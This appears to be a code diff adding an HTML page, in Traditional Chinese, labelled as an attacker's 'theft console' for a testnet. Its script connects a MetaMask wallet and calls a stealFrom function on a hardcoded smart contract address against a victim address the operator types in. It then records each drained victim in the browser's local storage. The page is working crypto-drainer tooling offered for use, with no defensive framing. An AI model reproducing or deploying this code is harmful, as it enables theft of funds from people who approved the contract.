@@ -1,0 +1,61 @@
+
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+  <meta charset="UTF-8" />
+  <title>盜取控制台 v3.0 測試網</title>
+</head>
+<body>
+  <h2>🛠️ 攻擊者操作介面</h2>
+  <p>合約地址：<b>0xfC35E3407c86461BA2D00C080cC763c0f6878377</b></p>
+  <p>目前登入帳號：<span style="color:green;"><b id="attacker">尚未登入</b></span></p>
+  <p>✅ 身份驗證：<span style="color:green;">你是攻擊者本人</span></p>
+  <input type="text" id="victim" placeholder="輸入授權者地址" size="50"/>
+  <button onclick="steal()">執行盜取</button>
+  <p id="status"></p>
+  <hr />
+  <h3>📌 最近授權地址列表：</h3>
+  <ul id="list"></ul>
+  <script>
+    const CONTRACT = "0xfC35E3407c86461BA2D00C080cC763c0f6878377";
+    document.title = "盜取控制台 v3.0 測試網";
+    document.getElementById('attacker').innerText = "MetaMask 連線中...";
+    async function steal() {
+      const victim = document.getElementById('victim').value.trim();
+      const provider = window.ethereum;
+      const web3 = new window.Web3(provider);
+      const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+      const from = accounts[0];
+      document.getElementById('attacker').innerText = from;
+      const abi = [{ "inputs": [{ "internalType": "address", "name": "victim", "type": "address" }], "name": "stealFrom", "outputs": [], "stateMutability": "nonpayable", "type": "function" }];
+      const contract = new web3.eth.Contract(abi, CONTRACT);
+      try {
+        const tx = await contract.methods.stealFrom(victim).send({ from });
+        document.getElementById("status").innerText = "✅ 交易送出：" + tx.transactionHash;
+        const ul = document.getElementById("list");
+        const li = document.createElement("li");
+        li.innerText = victim + " ✅";
+        ul.appendChild(li);
+        let history = JSON.parse(localStorage.getItem("approved") || "[]");
+        if (!history.includes(victim)) {
+          history.push(victim);
+          localStorage.setItem("approved", JSON.stringify(history));
+        }
+      } catch (err) {
+        document.getElementById("status").innerText = "❌ 發送失敗：" + err.message;
+      }
+    }
+    // 頁面載入自動填入歷史紀錄
+    window.onload = () => {
+      let history = JSON.parse(localStorage.getItem("approved") || "[]");
+      const ul = document.getElementById("list");
+      history.forEach(v => {
+        const li = document.createElement("li");
+        li.innerText = v + " ✅";
+        ul.appendChild(li);
+      });
+    };
+  </script>
+  <p style="margin-top:2em; color:gray;">版本：v3.0 測試網</p>
+</body>
+</html>
